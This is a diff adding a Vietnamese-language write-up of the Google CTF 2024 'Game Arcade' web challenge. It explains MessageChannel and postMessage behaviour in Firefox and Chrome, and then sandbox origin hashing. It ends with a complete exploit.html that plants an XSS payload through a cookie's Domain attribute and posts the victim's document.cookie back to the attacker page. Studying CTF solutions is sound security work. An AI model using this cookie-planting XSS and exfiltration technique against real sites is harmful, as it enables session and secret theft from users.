@@ -482,6 +482,209 @@ const evaluatorHtml = `
 
 ![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/e0b3c7f1-e26b-4945-bff9-df28a1ff4cb5)
 
-## GAME ARCADE (To be updated...)
+## GAME ARCADE
+
+Bài này gần giống bài postviewerv3 về cơ chế sandbox, một trong những điểm khác biệt đáng lưu ý đó là browser mà bài này sử dụng là firefox. 
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/17687953-ecef-4445-8141-a20924f9944d)
+
+Vậy thì có thể đây là một behavior này đó đặc biệt của firefox chăng? Đầu tiên thì cứ ngồi analyze xem bài này có gì. Cơ chế tạo hash cho sbx origin của bài khá giống với postviewerv3, khác là các factor được dùng để tạo hash giờ đây được ngăn cách bằng delimiter là `$@#|`
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/8c52882f-28de-4aa1-b414-9f072c5c6e65)
+
+Mỗi khi ta chọn một game, một sbx origin cũng sẽ được tạo ra để render và sandbox HTML của game đó lại, đáng lưu ý thì có một game là password guessing, cũng là game duy nhất mà con bot có tương tác. Cụ thể thì con bot sẽ nhả flag vào ô change password của game này, có vẻ ta sẽ phải tìm cách để leak flag trong game này. Hẳn bạn còn nhớ cơ chế giao tiếp giữa sbx origin và origin của challenge trong bài trước, đó chính là thông qua postMessage, ở bài này cũng vậy tuy nhiên thì ở bài này postMessage diễn ra thông qua một MessageChannel: https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel
+
+### MessageChannel
+
+Khi làm việc với MessageChannel thì ta sẽ có 2 `port`, ta sẽ nhận message bằng một port (tạm gọi port A) và gửi port còn lại (tạm gọi port B) cho đầu nhận, đầu nhận nếu cần reply lại message vừa rồi thì sẽ thực hiện postMessage thông qua port B, port A sẽ là nơi được đầu gửi setup message handler nhằm nhận message. Vạy thì tại sao bài này lại dùng MessageChannel? Cùng lấy 1 ví dụ
+
+a.html:
+
+```html
+<script>
+    const messageChannel = new MessageChannel();
+    messageChannel.port1.onmessage = (e) => {
+        console.log("recv from channel:")
+
+        console.log(e.data)
+    }
+
+    window.onmessage = (e) => {
+        console.log("recv from window.onmessage:")
+
+        console.log(e.data)
+    }
+
+    const win = window.open("b.html");
+
+    setTimeout(() => {
+        win.postMessage("aaa", "*", [messageChannel.port2])
+    }, 1000);
+</script>
+```
+
+b.html:
+
+```html
+<script>
+    window.onmessage = (e) => {
+        console.log("message received, sending callback...")
+        console.log(e)
+        e.ports[0].postMessage("aaa")
+    }
+</script>
+```
+
+Ở đây thì sẽ chỉ có callback của `messageChannel.port1` là chạy, vậy thì nó sẽ giúp ích gì nhỉ? Đó là nếu như a.html đột nhiên bị redirect đến một origin khác trước khi `e.source.postMessage` của `b.html` kịp chạy, từ đó nơi mà data đến postMessage đến có thể là một trang do attacker dựng nên nhằm capture lại secret gì đó của user. TUY NHIÊN, giả thuyết này lại không đúng đối với google chrome, hãy xem ví dụ sau:
+
+a.html:
+
+```html
+<script>
+    const messageChannel = new MessageChannel();
+    messageChannel.port1.onmessage = (e) => {
+        console.log("recv from channel:")
+
+        console.log(e.data)
+    }
+
+    window.onmessage = (e) => {
+        console.log("recv from window.onmessage:")
+
+        console.log(e.data)
+    }
+
+    const win = window.open("b.html");
+
+    setTimeout(() => {
+        win.postMessage("aaa", "*", [messageChannel.port2]);
+        window.location = "c.html"
+    }, 1000);
+</script>
+```
+
+b.html:
+
+```html
+<script>
+    const sleep = d => new Promise(r => setTimeout(r, d));
+    window.onmessage = async (e) => {
+        console.log("message received, sending callback...")
+        console.log(e)
+        // e.ports[0].postMessage("aaa")
+        await sleep(10000);
+        e.source.postMessage("secret", "*")
+    }
+</script>
+```
+
+c.html:
+
+```html
+<script>
+    window.onmessage = (e) => {
+        console.log("secret captured: " + e.data)
+    }
+</script>
+```
+
+Khi chạy ở Google Chrome:
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/79a594af-90e5-4b91-8547-d6e7339bfbd7)
+
+Có thể thấy rằng khi tab của a.html bị redirect, `e.source` ngay lập tức được gán `null`
+
+Khi chạy ở Firefox:
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/304f4287-e82c-4033-a030-4bad85b7f383)
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/d3a62865-2c9d-4b66-a52b-e7e9115c5551)
+
+Điều xảy ra ở Chrome đã không giống với điều xảy ra ở firefox, thú vị đấy... Giờ thì ta đã hiểu vai trò của MessageChannel rồi
+
+### shim.html
+
+Hãy cùng nhìn vào `shim.html` của sbx origin
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/2ce3afa9-9c65-4b7e-bd0a-eaefc499c5a8)
+
+Cũng không hẳn là ta phải reverse đống này, ta chỉ cần chú ý vào cái message handler của nó thôi, đại khái là nó sẽ compare hash của data được postMessage đến và sau đó render nó bằng blob URL. 
+
+### password game
+
+Ta nhanh chóng tìm được nhiều sink `innerHTML` được sử dụng
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/92145f54-fc52-42b7-90f1-c8061226ce5d)
+
+Trong đó có một nơi mà tainted data có thể flow từ source `document.cookie` (hoặc `localStorage`) đến sink `innerHTML`. Để có thể chèn được data vào Local Storage, ta sẽ cần XSS được sbx origin đó, nhìn lại cách mà game được sandbox thì thay vì bằng iframe như lần trước thì giờ đây nó là 1 window riêng biệt, ta sẽ không thể `win.frames[0].eval(...)` như lần trước được. Vậy thì làm sao đây? Ta vẫn còn `document.cookie`, và nếu như bạn đã quên thì ta có thể specify các thuộc tính cho cookie (như httponly, secure flag, ...), một trong số đó là thuộc tính `Domain`
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/ff1b3759-cea8-41de-8c82-8a3709418335)
+
+Một subdomain sẽ có thể share cookie với một domain hoặc subdomain khác (`A.example.com` có thể share cookie với `B.A.example.com`)
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/168f832f-b751-4d18-8576-6670f6fe4c89)
+
+Để ý rằng tại `shim.html`, nếu ta dùng một origin có dạng `<hash1>-h641507400.0ta1gxvglkyjct11uf3lvr9g3b45whebmhcjklt106au2kgy3e-h641507400.scf.usercontent.goog`, với `hash1` sẽ là hash của payload của ta. Như thế thì ta có thể lợi dụng XSS để set cookie `password=<XSS>` cho domain `0ta1gxvglkyjct11uf3lvr9g3b45whebmhcjklt106au2kgy3e-h641507400.scf.usercontent.goog` và trigger XSS một lần nữa nhằm lấy flag từ `localStorage`. Tuy nhiên có một điều hơi cấn, `correctPasswordSpan` sẽ không được insert vào DOM cho đến khi password được guess đúng.
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/5e4eb247-fd9e-4478-8f93-85f8543ea42f)
+
+Challenge này đã nhắc cho ta rằng element không cần thiết phải được insert vào DOM để có thể trigger XSS
+
+### Firefox???
+
+Tới đây ta sẽ có `exploit.html` như sau (original exploit from **@Terjang**)
+
+```html
+<body>
+    <!-- Import crypto functions from the challenge. -->
+    <script src="https://game-arcade-web.2024.ctfcompetition.com/static/safe-frame.js"></script>
+  
+    <script>
+      const passwordGameHash = '0ta1gxvglkyjct11uf3lvr9g3b45whebmhcjklt106au2kgy3e-h641507400.scf.usercontent.goog';
+      const CHALL_URL = 'https://game-arcade-web.2024.ctfcompetition.com/#1';
+      const sleep = d => new Promise(r => setTimeout(r, d));
+      (async function () {
+        const xss = escape(`xss<img src onerror="opener.opener.postMessage({flag:document.cookie}, '*')">`);
+        // const xss = escape(`xss<img src onerror="alert(1)">`);
+        const exploit = `<script>document.cookie="password=${xss};Domain=${passwordGameHash};Path=/";alert(123);<\/script>`;
+        const hash = await calculateHash('google-ctf', new ArrayBuffer(0), origin);
+  
+        /**
+         * There is a bug that allows to execute on the same site as the password game.
+         * Set an XSS inside a cookie and leak admin's cookie.
+        */
+        const win = open(`http://${hash}-h641507400.${passwordGameHash}/google-ctf/shim.html?origin=${encodeURIComponent(origin)}&cache=1`);
+        await sleep(1000);
+  
+        win.postMessage({ body: exploit, mimeType: 'text/html', salt: new ArrayBuffer(0) }, '*');
+        
+        // await sleep(3000);
+        open(CHALL_URL);
+        window.onmessage = e => {
+          if (e.data?.flag) {
+            console.log(e.data.flag);
+            location = 'about:blank#' + e.data.flag.split(';')[0];
+          }
+        }
+      })();
+  
+  
+  
+    </script>
+  
+  </body>
+```
+
+Tuy nhiên nếu bạn chạy exploit này trên Chrome, flag sẽ không được trả về, đó là vì đối với blob origin, ta sẽ không thể set cookie được 
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/c85bb834-c065-47a9-833a-094e82d9566c)
+
+Tuy nhiên đối với Firefox thì khác
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/e37b739b-57ba-464c-ad3e-4a3d6c962b77)
+
+Và khi report `exploit.html` cho bot thì ta sẽ có flag thông qua thông báo lỗi trả về 
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/253ff2fc-d054-4e7f-b468-507b851566b3)
 
 ## IN-THE-SHADOWS (To be updated...)
